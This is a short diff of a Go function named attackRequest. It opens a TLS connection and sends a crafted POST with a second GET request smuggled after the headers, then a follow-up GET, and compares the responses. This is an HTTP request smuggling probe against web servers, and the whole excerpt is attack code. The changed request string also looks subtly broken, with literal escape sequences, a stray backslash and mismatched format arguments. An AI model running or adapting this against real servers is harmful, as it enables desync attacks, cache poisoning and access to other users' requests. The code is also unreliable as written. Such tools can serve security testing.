@@ -12,7 +12,7 @@ import (
 
 var tlsConn *tls.Conn
 
-func attackRequest(host string, port int, path string,PAYLOAD string) (string, string) {
+func attackRequest(host string, port int, path string, url string) (string, string) {
 
 	var responses1 string = ""
 	var responses2 string = ""
@@ -24,9 +24,9 @@ func attackRequest(host string, port int, path string,PAYLOAD string) (string, s
 		tlsConn, err = createTLSConnection(tcpConn)
 		if err == nil {
 			defer tlsConn.Close()
-			err = sendRequest("POST %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\n%sGET /robots.txt HTTP/1.1\r\nFoo: x", path, host,PAYLOAD)
+			err = sendRequest(`POST / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nX-Blah-Ignore: 100\r\n\r\nGET /PATH HTTP/1.1\r\nIf-Match: "123456"\r\n\Foo: x`, host, path)
 			if err == nil {
-				err = sendRequest("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n\r\n", host)
+				err = sendRequest("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n\r\n", path, host)
 				if err == nil {
 					responsePrefix := "HTTP/1.1"
 					responseCount := 2
